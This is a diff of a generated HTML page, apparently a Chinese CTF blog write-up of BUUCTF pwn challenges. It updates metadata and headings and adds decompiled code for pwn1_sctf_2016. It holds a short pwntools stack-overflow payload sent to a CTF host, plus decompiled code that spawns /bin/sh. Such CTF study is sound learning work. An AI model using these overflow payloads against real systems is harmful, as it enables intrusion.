@@ -74,7 +74,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412191515409.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412191439413.png">
 <meta property="article:published_time" content="2024-12-03T16:02:19.000Z">
-<meta property="article:modified_time" content="2025-02-06T03:32:23.969Z">
+<meta property="article:modified_time" content="2025-03-18T14:10:50.157Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040012137.png">
@@ -270,7 +270,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          1.4k 字
         
       </span>
     
@@ -281,7 +281,7 @@
         
         
         
-          11 分钟
+          12 分钟
         
       </span>
     
@@ -375,7 +375,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25172&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040060D</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041127242.png" srcset="/img/loading.gif" lazyload alt="image-20241204112719202"></p>
-<h3 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041247391.png" srcset="/img/loading.gif" lazyload alt="image-20241204124756352"></p>
+<h3 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="*4.ciscn_2019_n_1"></a>*4.ciscn_2019_n_1</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041247391.png" srcset="/img/loading.gif" lazyload alt="image-20241204124756352"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134458.png" srcset="/img/loading.gif" lazyload alt="image-20241204113446414"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041134328.png" srcset="/img/loading.gif" lazyload alt="image-20241204113459274"></p>
 <p>①：</p>
@@ -395,13 +395,16 @@
 <p>3.直接转：</p>
 <p>双击dword_4007F4直接跳转到</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412050043024.png" srcset="/img/loading.gif" lazyload alt="image-20241205004307855"></p>
-<h3 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041238965.png" srcset="/img/loading.gif" lazyload alt="image-20241204123847897"></p>
+<h3 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="*5.pwn1_sctf_2016"></a>*5.pwn1_sctf_2016</h3><p>32位——转换</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041238965.png" srcset="/img/loading.gif" lazyload alt="image-20241204123847897"></p>
 <p>分析这段代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  const char *v0; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-3Ch] BYREF<br>  char v3[<span class="hljs-number">4</span>]; // [esp+3Ch] [ebp-1Ch] BYREF<br>  char v4[<span class="hljs-number">7</span>]; // [esp+40h] [ebp-18h] BYREF<br>  char v5; // [esp+47h] [ebp-11h] BYREF<br>  char v6[<span class="hljs-number">7</span>]; // [esp+48h] [ebp-10h] BYREF<br>  char v7[<span class="hljs-number">5</span>]; // [esp+4Fh] [ebp-9h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  fgets(s, <span class="hljs-number">32</span>, edata);<br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, s);<br>  std::allocator&lt;char&gt;::allocator(&amp;v5);<br>  std::string::string(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;char&gt;::allocator(v7);<br>  std::string::string(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  replace((std::string *)v3);             <span class="hljs-comment">#</span><br>  std::string::operator=(&amp;<span class="hljs-built_in">input</span>, v3, v6, v4);<br>  std::string::~string(v3);<br>  std::string::~string(v6);<br>  std::allocator&lt;char&gt;::~allocator(v7);<br>  std::string::~string(v4);<br>  std::allocator&lt;char&gt;::~allocator(&amp;v5);<br>  v0 = (const char *)std::string::c_str((std::string *)&amp;<span class="hljs-built_in">input</span>);<br>  strcpy(s, v0);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br></code></pre></td></tr></table></figure>
+
 <p>定义的变量s据栈地3C（60），但是看fgets函数只填入了32个，没有办法栈溢出了；</p>
 <p>但是看下面有个I,you</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">replace((std::string *)v3);<br></code></pre></td></tr></table></figure>
 
-<p>妹子不理解，但是通过查看wp，了解到是将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
+<p>将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
 <p>（又查看wp，发现可以先猜测一下，他是将I换成了you，然后跑一下，看看：</p>
 <p>{【打开终端，输入：.&#x2F;文件名】</p>
 <p>enter后显示： tell me something about yourself:</p>
@@ -416,7 +419,7 @@
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041430248.png" srcset="/img/loading.gif" lazyload alt="image-20241204143053201"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041423503.png" srcset="/img/loading.gif" lazyload alt="image-20241204142330451"></p>
 <h3 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h3><p>(本题涉及栈溢出，栈不平衡)</p>
-<p>首先查看main函数，没什么好看的，点开func（）</p>
+<p>首先查看main函数，然后点开func（）</p>
 <p>发现read()函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041520500.png" srcset="/img/loading.gif" lazyload alt="image-20241204152005447"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041521576.png" srcset="/img/loading.gif" lazyload alt="image-20241204152136510"></p>
@@ -428,11 +431,12 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041519892.png" srcset="/img/loading.gif" lazyload alt="image-20241204151901820"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041530974.png" srcset="/img/loading.gif" lazyload alt="image-20241204153020897"></p>
-<h2 id="7-第五空间2019-决赛-PWN5——未处理"><a href="#7-第五空间2019-决赛-PWN5——未处理" class="headerlink" title="7.[第五空间2019 决赛]PWN5——未处理"></a>7.[第五空间2019 决赛]PWN5——未处理</h2><p>考察格式化字符串漏洞</p>
+<h3 id="7-第五空间2019-决赛-PWN5——未处理"><a href="#7-第五空间2019-决赛-PWN5——未处理" class="headerlink" title="7.[第五空间2019 决赛]PWN5——未处理"></a>7.[第五空间2019 决赛]PWN5——未处理</h3><p>考察格式化字符串漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" srcset="/img/loading.gif" lazyload alt="image-20241204153640514"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042041277.png" srcset="/img/loading.gif" lazyload alt="image-20241204204135165"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042050030.png" srcset="/img/loading.gif" lazyload alt="image-20241204205037946"></p>
-<h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="8.ciscn_2019_n_8"></a>8.ciscn_2019_n_8</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>die</p>
+<h3 id="8-ciscn-2019-n-8"><a href="#8-ciscn-2019-n-8" class="headerlink" title="*8.ciscn_2019_n_8"></a>*8.ciscn_2019_n_8</h3><p>level2</p>
+<p>die</p>
 <p>反汇编查看：</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )          <span class="hljs-comment">//如果var中的第14个数为17，进入</span><br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);                        <span class="hljs-comment">//找到system</span><br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
